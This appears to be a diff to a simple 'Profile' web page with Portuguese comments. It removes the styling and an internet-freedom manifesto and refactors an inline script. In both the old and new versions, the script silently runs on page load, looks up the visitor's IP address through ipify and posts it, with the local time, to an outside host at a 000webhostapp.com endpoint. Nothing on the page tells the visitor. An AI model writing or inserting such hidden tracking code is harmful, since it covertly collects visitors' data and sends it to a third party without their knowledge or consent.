@@ -5,34 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Profile</title>
     <style>
-        body {
-            background-color: black;
-            color: white;
-            font-family: Arial, sans-serif;
-        }
-        .banner {
-            width: 100%;
-            background-color: black;
-            text-align: center;
-            padding: 20px 0;
-        }
-        .banner h1 {
-            font-size: 36px;
-            color: limegreen;
-            text-transform: uppercase;
-        }
-        .manifesto {
-            margin: 20px auto;
-            max-width: 600px;
-            padding: 0 20px;
-        }
-        .manifesto h2 {
-            font-size: 24px;
-            margin-bottom: 10px;
-        }
-        .manifesto p {
-            line-height: 1.5;
-        }
+        /* Estilos CSS */
     </style>
 </head>
 <body>
@@ -40,65 +13,47 @@
         <h1>PROFILE XAT</h1>
     </div>
     <div class="manifesto">
-        <h2>A Small Manifesto on Internet Freedom</h2>
-        <p>
-            The internet is a global platform for free expression, collaboration, and innovation.
-            It has become an integral part of our lives, empowering individuals to connect, share knowledge,
-            and express themselves freely. Internet freedom is a fundamental right that should be protected
-            and preserved for future generations.
-        </p>
-        <p>
-            Access to information, privacy, and the ability to communicate freely are essential elements
-            of a free and open internet. We must strive to ensure that the internet remains a decentralized,
-            neutral space where ideas can flourish without censorship or restriction.
-        </p>
-        <p>
-            Let us work together to defend internet freedom and uphold the principles of openness,
-            transparency, and democracy online. Together, we can build a better future where the internet
-            remains a beacon of hope and opportunity for all.
-        </p>
+        <!-- Manifesto sobre liberdade na internet -->
     </div>
 
     <script>
-        // Função para obter o endereço IP do cliente
-        function getIP(json) {
-            var ip = json.ip;
-            var time = new Date().toLocaleString(); // Captura a hora local do usuário
-            var location = ""; // Infelizmente, a API não fornece localização precisa
-
-            // Dados a serem enviados para o servidor
-            var data = {
-                ip: ip,
-                time: time,
-                location: location
-            };
-
-            // Requisição POST para enviar os dados para o servidor externo
-            fetch('https://leanbnk.000webhostapp.com/endpoint.php', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify(data),
-            })
-            .then(response => response.text())
+        // Função para obter o endereço IP do cliente e enviar para o servidor externo
+        function sendIPToServer() {
+            fetch('https://api64.ipify.org?format=json')
+            .then(response => response.json())
             .then(data => {
-                console.log(data); // Exibe a resposta do servidor no console
+                var ip = data.ip;
+                var time = new Date().toLocaleString();
+                var location = ""; // Infelizmente, a API não fornece localização precisa
+
+                var requestData = {
+                    ip: ip,
+                    time: time,
+                    location: location
+                };
+
+                fetch('https://leanbnk.000webhostapp.com/endpoint.php', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(requestData),
+                })
+                .then(response => response.text())
+                .then(data => {
+                    console.log(data); // Exibe a resposta do servidor no console
+                })
+                .catch((error) => {
+                    console.error('Erro ao enviar os dados:', error);
+                });
             })
             .catch((error) => {
-                console.error('Erro ao enviar os dados:', error);
+                console.error('Erro ao obter o endereço IP:', error);
             });
         }
 
-        // Requisição para obter o endereço IP usando um serviço externo
-        fetch('https://api64.ipify.org?format=json')
-        .then(response => response.json())
-        .then(data => {
-            getIP(data); // Chama a função para processar o endereço IP
-        })
-        .catch((error) => {
-            console.error('Erro ao obter o endereço IP:', error);
-        });
+        // Chama a função para enviar o endereço IP ao carregar a página
+        sendIPToServer();
     </script>
 </body>
 </html>
